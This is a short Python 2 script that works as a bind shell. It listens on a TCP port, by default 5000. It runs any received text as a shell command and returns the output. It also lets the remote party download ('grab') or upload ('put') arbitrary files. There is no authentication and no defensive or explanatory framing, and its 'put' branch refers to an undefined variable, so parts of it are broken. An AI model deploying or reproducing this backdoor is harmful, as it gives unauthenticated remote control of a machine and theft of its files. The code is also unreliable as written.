import socket
import os
import sys
import subprocess
import struct

HOST = ''

'''
Command line arguments.
Default to port 5000
'''
if '-p' in sys.argv:
    try:
        PORT = int(sys.argv[sys.argv.index('-p') + 1])
    except:
        print "Invalid port input"
        PORT = 5000
else:
    PORT = 5000


def grab(file_name):
    file_string = open(file_name, "rb").read()
    file_size = len(file_string)
    return struct.pack('>I', file_size) +  file_string

def get_file(sock):
    full_message = recvall(sock, 4)
    if not full_message:
        return None
    mess_length = struct.unpack('>I', full_message)[0]
    return recvall(sock, mess_length)

def recvall(sock, n):
    data = ''
    while len(data) < n:
        piece = sock.recv(n - len(data))
        if not piece:
            return None
        data += piece
    return data


def open_connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    conn, addr = s.accept()
    return s, conn, addr


if __name__ == "__main__":
    s, conn, addr = open_connection(HOST, PORT)
    while 1:
        data = conn.recv(1024)
        if not data:
            break
        if data == "exit":
            conn.sendall(data)
            break

        try:
            if data.split()[0] == "grab":
                out = grab(data.split()[1])
            elif data.split()[0] == "put":
                data = get_file(conn)
                open(command.split()[1], "wb").write(data)
                out = 'Success'
            else:
                out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
                if not out:
                    out = "Done."
                if data.split()[0] == "cd":
                    os.chdir(data.split()[1])
        except Exception, e:
            out = str(e)
        conn.sendall(out)

    conn.close()
